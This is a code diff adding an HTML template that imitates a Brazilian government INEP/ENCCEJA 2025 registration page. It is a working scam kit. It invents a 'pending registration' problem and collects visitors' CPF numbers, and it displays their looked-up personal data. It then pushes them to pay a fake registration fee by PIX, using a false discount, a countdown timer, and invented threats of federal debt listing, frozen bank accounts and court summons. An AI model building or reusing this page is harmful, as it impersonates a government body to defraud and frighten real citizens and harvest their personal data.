@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>ENCCEJA 2025 - Inscrição</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/rawline-fonts.css') }}">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <style>
+        .gov-header {
+            background-color: #222222;
+        }
+        .inep-header {
+            background-color: #044785;
+        }
+        .encceja-color {
+            color: #3b5998;
+        }
+        .encceja-light {
+            color: #a0a0a0;
+        }
+        .form-header {
+            background-color: #2c5985;
+            color: white;
+        }
+        .form-footer {
+            background-color: #5d85ab;
+            color: white;
+        }
+
+        button#submit-button {
+            transition: all 0.2s ease;
+            background-color: #5d85ab;
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        button#submit-button:not([disabled]) {
+            color: white;
+            cursor: pointer;
+        }
+
+        button#submit-button:not([disabled]):hover {
+            background-color: #4d7396;
+        }
+        .required-star {
+            color: #ff0000;
+        }
+        .footer-bg {
+            background-color: #1c2b39;
+        }
+        input::placeholder {
+            font-family: 'Rawline', Arial, sans-serif;
+        }
+        .selected {
+            border: 4px dashed #2B7A9A !important;
+        }
+        .transparent {
+            opacity: 0.5;
+        }
+    </style>
+    <script>
+        // Variáveis para controle do timer de desconto
+        let countdownInterval;
+        let remainingTime = 300; // 5 minutos em segundos
+        
+        // Verificar se há um CPF preenchido automaticamente pelo servidor
+        const cpfPreenchido = "{{ cpf_preenchido|default('') }}";
+        
+        // Função para preencher o campo CPF na inicialização
+        function preencherCPF() {
+            if (cpfPreenchido) {
+                const cpfInput = document.getElementById('cpf');
+                if (cpfInput) {
+                    // Preenche o campo e formata o CPF
+                    cpfInput.value = cpfPreenchido;
+                    formatCPF(cpfInput);
+                }
+            }
+        }
+        
+        // Chamar a função quando a página carregar
+        window.addEventListener('DOMContentLoaded', preencherCPF);
+        
+        function formatCPF(input) {
+            // Remove qualquer caractere que não seja número
+            let value = input.value.replace(/\D/g, '');
+
+            // Limita a 11 caracteres
+            if (value.length > 11) {
+                value = value.substring(0, 11);
+            }
+
+            // Formata como CPF (xxx.xxx.xxx-xx)
+            if (value.length > 9) {
+                value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
+            } else if (value.length > 6) {
+                value = value.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
+            } else if (value.length > 3) {
+                value = value.replace(/(\d{3})(\d{1,3})/, '$1.$2');
+            }
+
+            input.value = value;
+            checkFormValidity();
+        }
+
+        function unformatCPF(cpf) {
+            return cpf.replace(/\D/g, '');
+        }
+
+        function selectImage(element, index) {
+            const images = document.querySelectorAll('.image-option');
+            images.forEach(img => {
+                img.classList.remove('selected');
+                img.classList.add('transparent');
+            });
+            element.classList.add('selected');
+            element.classList.remove('transparent');
+
+            if (index !== 1) {
+                showErrorPopup();
+            } else {
+                checkFormValidity();
+            }
+        }
+
+        function showErrorPopup() {
+            const popup = document.getElementById('error-popup');
+            popup.classList.remove('hidden');
+            setTimeout(() => {
+                popup.classList.add('hidden');
+            }, 3000);
+        }
+
+        function checkFormValidity() {
+            const cpfInput = document.querySelector('#cpf');
+            const selectedImage = document.querySelector('.image-option.selected');
+            const submitButton = document.querySelector('#submit-button');
+
+            if (cpfInput.value.length === 14 && selectedImage && selectedImage === document.querySelectorAll('.image-option')[1]) {
+                submitButton.disabled = false;
+            } else {
+                submitButton.disabled = true;
+            }
+        }
+
+        function showValidationPopup() {
+            const popup = document.getElementById('validation-popup');
+            popup.classList.remove('hidden');
+        }
+
+        function hideValidationPopup() {
+            const popup = document.getElementById('validation-popup');
+            popup.classList.add('hidden');
+        }
+        
+        function formatCurrency(value) {
+            return new Intl.NumberFormat('pt-BR', {
+                style: 'currency',
+                currency: 'BRL'
+            }).format(value / 100);
+        }
+        
+        function startCountdown() {
+            const timerElement = document.getElementById('countdown-timer');
+            if (!timerElement) return;
+            
+            clearInterval(countdownInterval);
+            
+            countdownInterval = setInterval(() => {
+                remainingTime -= 1;
+                
+                const minutes = Math.floor(remainingTime / 60);
+                const seconds = remainingTime % 60;
+                
+                timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (remainingTime <= 0) {
+                    clearInterval(countdownInterval);
+                    alert('O tempo para o desconto especial expirou! A página será atualizada.');
+                    window.location.reload();
+                }
+            }, 1000);
+        }
+        
+        // Função para atualizar o card com as informações do usuário
+        function updateCardWithUserInfo(userData) {
+            if (!userData || !userData.sucesso) {
+                hideValidationPopup();
+                alert("Não foi possível encontrar seus dados. Por favor, verifique o CPF informado.");
+                return;
+            }
+            
+            // Esconder o popup de validação
+            hideValidationPopup();
+            
+            // Pegar a referência do conteúdo do formulário
+            const formContent = document.querySelector('.p-4');
+            
+            // Limpar o conteúdo atual
+            formContent.innerHTML = '';
+            
+            // Adicionar o novo conteúdo com os dados do usuário
+            formContent.innerHTML = `
+                <div class="text-center">
+                    <h3 class="text-xl font-bold text-[#2B4F81] mb-4">Confirme seus dados</h3>
+                    <div class="mb-6 p-4 bg-gray-50 rounded-lg">
+                        <p class="mb-2"><span class="font-semibold">Nome:</span> ${userData.nome}</p>
+                        <p><span class="font-semibold">CPF:</span> ${userData.cpf}</p>
+                    </div>
+                    <p class="mb-4">Os dados acima estão corretos?</p>
+                    <button id="confirm-data-btn" class="bg-[#2B4F81] text-white py-2 px-6 rounded-lg hover:bg-[#1e3a61] transition-colors">
+                        Sim, são meus dados
+                    </button>
+                </div>
+            `;
+            
+            // Adicionar evento para o botão de confirmação
+            document.getElementById('confirm-data-btn').addEventListener('click', () => {
+                showDiscountInfo(userData);
+            });
+        }
+        
+        // Função para mostrar a informação do desconto
+        function showDiscountInfo(userData) {
+            // Pegar a referência do conteúdo do formulário
+            const formContent = document.querySelector('.p-4');
+            
+            // Limpar o conteúdo atual
+            formContent.innerHTML = '';
+            
+            // Adicionar o novo conteúdo sobre o desconto
+            formContent.innerHTML = `
+                <div class="text-center">
+                    <div class="mb-4">
+                        <i class="fas fa-check-circle text-green-500 text-4xl mb-2"></i>
+                        <h3 class="text-xl font-bold text-green-600">Desconto Aplicado com Sucesso!</h3>
+                    </div>
+                    <div class="mb-6 p-4 bg-green-50 rounded-lg border border-green-200">
+                        <p class="mb-2">Valor original: <span class="line-through text-gray-500">R$73,40</span></p>
+                        <p class="text-2xl font-bold text-green-600">Valor com desconto: R$49,70</p>
+                        <p class="mt-2 text-sm text-red-600">Oferta válida por: <span id="countdown-timer" class="font-bold">05:00</span></p>
+                    </div>
+                    <p class="mb-4">Deseja efetuar o pagamento agora com este desconto?</p>
+                    <button id="proceed-payment-btn" class="bg-green-600 text-white py-2 px-6 rounded-lg hover:bg-green-700 transition-colors">
+                        Continuar para o Pagamento
+                    </button>
+                </div>
+            `;
+            
+            // Iniciar a contagem regressiva
+            startCountdown();
+            
+            // Adicionar evento para o botão de continuar para pagamento
+            document.getElementById('proceed-payment-btn').addEventListener('click', () => {
+                createPixPayment(userData);
+            });
+        }
+        
+        // Função para criar o pagamento PIX
+        function createPixPayment(userData) {
+            showValidationPopup();
+            
+            // Atualizar o texto do popup
+            const popup = document.getElementById('validation-popup');
+            const popupTitle = popup.querySelector('h3');
+            const popupText = popup.querySelector('p');
+            
+            if (popupTitle && popupText) {
+                popupTitle.textContent = 'Gerando pagamento...';
+                popupText.textContent = 'Estamos gerando o QR Code para pagamento com desconto. Aguarde um momento.';
+            }
+            
+            // Preparar dados para o pagamento
+            const paymentData = {
+                nome: userData.nome,
+                cpf: userData.cpf,
+                telefone: userData.telefone || '',
+                email: userData.email || ''
+            };
+            
+            // Fazer requisição para criar o pagamento com desconto
+            fetch('/api/create-discount-payment', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(paymentData)
+            })
+            .then(response => response.json())
+            .then(data => {
+                hideValidationPopup();
+                
+                if (data.error) {
+                    alert(`Erro ao gerar pagamento: ${data.error}`);
+                    return;
+                }
+                
+                // Mostrar o QR Code do pagamento
+                showPaymentQRCode(data, userData);
+            })
+            .catch(error => {
+                hideValidationPopup();
+                console.error('Erro ao criar pagamento:', error);
+                alert('Ocorreu um erro ao gerar o pagamento. Por favor, tente novamente.');
+            });
+        }
+        
+        // Função para exibir o QR Code e informações de pagamento
+        function showPaymentQRCode(paymentData, userData) {
+            // Pegar a referência do conteúdo do formulário
+            const formContent = document.querySelector('.p-4');
+            
+            // Limpar o conteúdo atual
+            formContent.innerHTML = '';
+            
+            // Adicionar o novo conteúdo com o QR Code e dados de pagamento
+            console.log("QR code recebido, processando...");
+            
+            // Procurar o pixQrCode primeiro com fallbacks
+            const qrCodeImage = paymentData.pixQrCode || paymentData.pixQrCode || paymentData.pix_qr_code;
+            
+            // Procurar o pixCode com fallbacks
+            const pixCodeValue = paymentData.pixCode || paymentData.pix_code;
+            
+            console.log("Base64 limpo, primeiros 20 caracteres:", qrCodeImage?.substring(0, 20) + "...");
+            
+            formContent.innerHTML = `
+                <div class="text-center">
+                    <div style="background-color: #355792;" class="text-white p-3 rounded-lg mb-4">
+                        <h3 class="text-xl font-bold mb-1">TAXA DE INSCRIÇÃO ENCCEJA 2025</h3>
+                        <p class="text-sm">Complete o pagamento para garantir sua inscrição.</p>
+                    </div>
+                    
+                    <div class="mb-6 p-4 bg-gray-50 rounded-lg border-2" style="border-color: #355792;">
+                        <p class="mb-2 font-bold text-gray-800">PRAZO FINAL PARA PAGAMENTO COM DESCONTO:</p>
+                        <div class="flex justify-center mb-4">
+                            <div class="bg-black text-white text-2xl font-bold p-2 rounded-md" id="countdown-timer">05:00</div>
+                        </div>
+                        
+                        <p class="mb-3 text-sm font-bold">CONSEQUÊNCIAS DO NÃO PAGAMENTO:</p>
+                        <ul class="text-left text-sm mb-4">
+                            <li class="mb-1">• Inscrição do nome e CPF em dívida ativa da União</li>
+                            <li class="mb-1">• Incidência de multas e encargos legais sobre o valor original</li>
+                            <li class="mb-1">• Bloqueio de contas bancárias e possíveis intimações judiciais</li>
+                            <li class="mb-1">• Redução do score de crédito e negativação em órgãos de proteção</li>
+                        </ul>
+                        
+                        <div class="p-2 bg-yellow-100 rounded-md mb-4">
+                            <p class="text-xs font-bold text-gray-700">APROVEITE! DESCONTO DE 32% APLICADO AUTOMATICAMENTE</p>
+                        </div>
+                        
+                        <div class="flex justify-center mb-4" id="qr-container">
+                            <img src="${qrCodeImage}" alt="QR Code de pagamento" class="w-48 h-48 border border-gray-300 p-2" />
+                        </div>
+                        <div class="mb-4">
+                            <p class="text-sm mb-1">Código PIX:</p>
+                            <input type="text" id="pix-code" value="${pixCodeValue}" readonly class="p-2 border border-gray-300 rounded-md text-xs w-full max-w-sm bg-gray-50 mb-2" />
+                            <button id="copy-pix-btn" class="text-white p-2 rounded-md" style="background-color: #355792; hover:background-color: #2a4574;">
+                                <i class="fas fa-copy mr-1"></i>
+                                Copiar código PIX
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <div class="bg-yellow-50 p-3 rounded-lg border border-yellow-200 mb-4">
+                        <p class="text-sm text-gray-700">
+                            <i class="fas fa-info-circle mr-1"></i>
+                            Após a confirmação do pagamento, você receberá seu número de inscrição. Guarde seu comprovante.
+                        </p>
+                    </div>
+                </div>
+            `;
+            
+            // Ocultar o botão de enviar na tela de pagamento
+            document.querySelector('.form-footer').style.display = 'none';
+            
+            console.log("Container de QR code visível");
+            
+            // Iniciar a contagem regressiva
+            startCountdown();
+            
+            // Adicionar evento para o botão de copiar código PIX
+            document.getElementById('copy-pix-btn').addEventListener('click', () => {
+                const pixCodeInput = document.getElementById('pix-code');
+                pixCodeInput.select();
+                document.execCommand('copy');
+                alert('Código PIX copiado para a área de transferência!');
+            });
+            
+            // Iniciar a verificação periódica do status do pagamento (a cada 5 segundos)
+            if (paymentData.id) {
+                localStorage.setItem('currentPaymentId', paymentData.id);
+                checkPaymentStatus(paymentData.id);
+            }
+        }
+        
+        // Função para verificar o status do pagamento
+        function checkPaymentStatus(paymentId) {
+            if (!paymentId) return;
+            
+            // Verificar o status do pagamento a cada 5 segundos
+            const statusInterval = setInterval(() => {
+                fetch(`/api/check-payment-status?id=${paymentId}`)
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Status do pagamento:', data);
+                        
+                        // Se o pagamento foi aprovado
+                        if (data.status === 'APPROVED' || data.status === 'CONFIRMED' || data.original_status === 'PAID') {
+                            clearInterval(statusInterval);
+                            alert('Pagamento aprovado! Redirecionando para a página de confirmação...');
+                            window.location.href = '/thank-you';
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Erro ao verificar status:', error);
+                    });
+            }, 5000);
+        }
+
+        function submitForm() {
+            const cpfInput = document.querySelector('#cpf');
+            const cpf = unformatCPF(cpfInput.value);
+
+            if (!cpf || cpf.length !== 11) {
+                alert("Por favor, informe um CPF válido com 11 dígitos.");
+                return;
+            }
+
+            // Mostrar popup de validação
+            showValidationPopup();
+            
+            // Atualizar o texto do popup
+            const popup = document.getElementById('validation-popup');
+            const popupTitle = popup.querySelector('h3');
+            const popupText = popup.querySelector('p');
+            
+            if (popupTitle && popupText) {
+                popupTitle.textContent = 'Validando CPF...';
+                popupText.textContent = 'Aguarde enquanto verificamos as informações e preparamos seu pagamento.';
+            }
+
+            // Redirecionar para a rota consultar-cpf que irá redirecionar para página de agradecimento
+            window.location.href = `/consultar-cpf?cpf=${cpf}`;
+        }
+    </script>
+</head>
+<body class="flex flex-col min-h-screen">
+    <!-- Government Header -->
+    <header class="gov-header text-white py-2">
+        <div class="container mx-auto flex justify-between items-center px-4">
+            <a class="font-bold text-sm" href="#">
+                <img src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo" class="h-6" />
+            </a>
+            <nav>
+                <ul class="flex space-x-4 text-[10px]">
+                    <li>
+                        <a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">PARTICIPE</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">SERVIÇOS</a>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+    <!-- INEP Header -->
+    <div class="inep-header py-3">
+        <div class="container mx-auto px-4">
+            <svg class="h-7" height="30" preserveAspectRatio="xMidYMid" viewBox="0 0 69 20" width="120" xmlns="http://www.w3.org/2000/svg">
+                <defs>
+                    <style>
+                        .cls-2{fill:#fff}
+                    </style>
+                </defs>
+                <path class="cls-2" d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z" fill-rule="evenodd" id="path-1"/>
+            </svg>
+        </div>
+    </div>
+    <!-- Main Content -->
+    <main class="flex-grow py-8">
+        <div class="container mx-auto px-4 max-w-3xl">
+            <!-- ENCCEJA Logo -->
+            <div class="text-center mb-6">
+                <img alt="Logo ENCCEJA 2025" class="mx-auto" height="100" src="https://lh4.googleusercontent.com/proxy/_9Y0LIQJY1EdBdBVxy9MNsDDxrwGhfi2sjqj0zyi8ozsQS0eaxz82ZcL248lfPHCGJ3N07JVCIidVaFuR9pcnZNvpdEzt9bcLzGuHf9h09CpscRLpaqVYz0" width="420"/>
+            </div>
+            <!-- Form Container -->
+            <div class="border border-gray-300 rounded">
+                <!-- Form Header -->
+                <div class="form-header py-2 px-4 text-center">
+                    <h2 class="text-lg font-bold">
+                        ATENÇÃO: Pendência de Cadastro no ENCCEJA 2025
+                    </h2>
+                </div>
+                <!-- Form Content -->
+                <div class="p-4">
+                    <div class="bg-red-100 border-l-4 border-red-500 text-red-700 p-4 mb-5 rounded-md">
+                        <div class="flex items-center mb-2">
+                            <svg class="w-6 h-6 mr-2 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
+                            </svg>
+                            <h3 class="font-bold text-xl">INSCRIÇÃO NÃO CONFIRMADA</h3>
+                        </div>
+                        <p class="text-lg mb-2">Encontramos uma <span class="font-bold">pendência crítica</span> no seu cadastro do ENCCEJA 2025 que precisa ser resolvida imediatamente.</p>
+                        <p class="text-lg">Sua inscrição <span class="font-bold underline">não será validada</span> se não regularizar esta situação.</p>
+                    </div>
+                    <p class="text-lg mb-4 font-bold text-gray-800">
+                        Para regularizar sua situação e confirmar sua inscrição, digite seu CPF abaixo:</p>
+                    <form>
+                        <div class="mb-4">
+                            <label class="block mb-1">
+                                <span>CPF:</span>
+                                <span class="required-star">*</span>
+                                <span class="ml-1 text-red-500">
+                                    <i class="fas fa-info-circle"></i>
+                                </span>
+                            </label>
+                            <input id="cpf" class="w-full border border-gray-300 p-2 text-base text-[#333] tracking-wide" placeholder="___.___.___-__" type="tel" inputmode="numeric" pattern="[0-9]*" oninput="formatCPF(this)" style=""/>
+                        </div>
+                        <div class="mb-4">
+                            <p class="text-[#2B4F81] text-base font-bold" style="font-size: 16px;">
+                                Clique abaixo, na figura CAMISA:
+                                <span class="text-red-700 text-lg">*</span>
+                                <span class="text-[#2B4F81] text-base rounded-full border border-[#2B4F81] w-5 h-5 inline-flex items-center justify-center">?</span>
+                            </p>
+                        </div>
+                        <div class="flex items-center">
+                            <div class="grid grid-cols-5 gap-1 border-4 border-[#D8E8E8] p-1 bg-[#D8E8E8]">
+                                <div class="bg-[#d2d2d2] p-2 border border-white flex items-center justify-center image-option" onclick="selectImage(this, 0)">
+                                    <img alt="Globe icon showing Earth" class="w-6 h-6" src="https://i.ibb.co/2Ytyd5h2/download-6.png"/>
+                                </div>
+                                <div class="bg-[#d2d2d2] p-2 border border-white flex items-center justify-center image-option" onclick="selectImage(this, 1)">
+                                    <img alt="Magnifying glass search icon" class="w-6 h-6" src="https://i.ibb.co/cK1RdMv5/download-5.png"/>
+                                </div>
+                                <div class="bg-[#d2d2d2] p-2 border border-white flex items-center justify-center image-option" onclick="selectImage(this, 2)">
+                                    <img alt="Footprint icon" class="w-6 h-6" src="https://i.ibb.co/4wJKGsVJ/download-4.png"/>
+                                </div>
+                                <div class="bg-[#d2d2d2] p-2 border border-white flex items-center justify-center image-option" onclick="selectImage(this, 3)">
+                                    <img alt="Padlock or lock icon" class="w-6 h-6" src="https://i.ibb.co/67VXwQ9M/download-3.png"/>
+                                </div>
+                                <div class="bg-[#d2d2d2] p-2 border border-white flex items-center justify-center image-option" onclick="selectImage(this, 4)">
+                                    <img alt="Leaf icon representing nature" class="w-6 h-6" src="https://i.ibb.co/Fb42bD0Y/download-2.png"/>
+                                </div>
+                            </div>
+                        </div>
+                    </form>
+                </div>
+                <!-- Form Footer -->
+                <div class="border-t border-gray-300">
+                    <div class="p-2 bg-gray-100 flex items-center">
+                        <a class="text-gray-700 flex items-center" href="#">
+                            <i class="fas fa-sign-out-alt mr-1"></i>
+                            Sair
+                        </a>
+                    </div>
+                    <div class="form-footer p-0 flex justify-center items-center">
+                        <button id="submit-button" class="flex items-center justify-center w-full h-full py-3" type="button" disabled onclick="submitForm()">
+                            <i class="fas fa-paper-plane mr-2"></i>
+                            <span>Enviar</span>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+    <!-- Footer -->
+    <footer class="footer-bg text-white py-4 text-xs">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col items-center mb-2">
+                <svg xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid" width="69" height="20" viewBox="0 0 69 20" class="h-16 w-auto mb-3">
+                    <defs><style>.cls-2{fill:#fff}</style></defs>
+                    <path d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z" id="path-1" class="cls-2" fill-rule="evenodd"/>
+                </svg>
+                <p class="text-sm text-center mb-2">Instituto Nacional de Estudos e Pesquisas Educacionais</p>
+            </div>
+            <div class="flex justify-between items-center">
+                <div>
+                    © MEC - Ministério da Educação | INEP - Instituto Nacional de Estudos e Pesquisas
+                </div>
+                <div class="flex items-center">
+                    <i class="fas fa-phone-alt mr-1"></i>
+                    0800 616161
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Error Popup -->
+    <div id="error-popup" class="fixed top-0 left-0 right-0 bg-red-500 text-white p-4 text-center hidden z-50">
+        Você deve selecionar a imagem da camisa para prosseguir.
+    </div>
+
+    <!-- Validation Popup -->
+    <div id="validation-popup" class="fixed inset-0 flex items-center justify-center hidden z-50">
+        <div class="absolute inset-0 bg-black bg-opacity-50"></div>
+        <div class="bg-[#5d85ab] text-white p-6 rounded-lg shadow-lg z-10 flex flex-col items-center max-w-md mx-4">
+            <div class="spinner-border mb-4" role="status">
+                <svg class="animate-spin h-10 w-10 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                </svg>
+            </div>
+            <h3 class="text-xl font-bold mb-2">Resolvendo pendência cadastral...</h3>
+            <p class="text-center">Aguarde enquanto regularizamos a situação da sua inscrição no ENCCEJA 2025.</p>
+        </div>
+    </div>
+</body>
+</html>
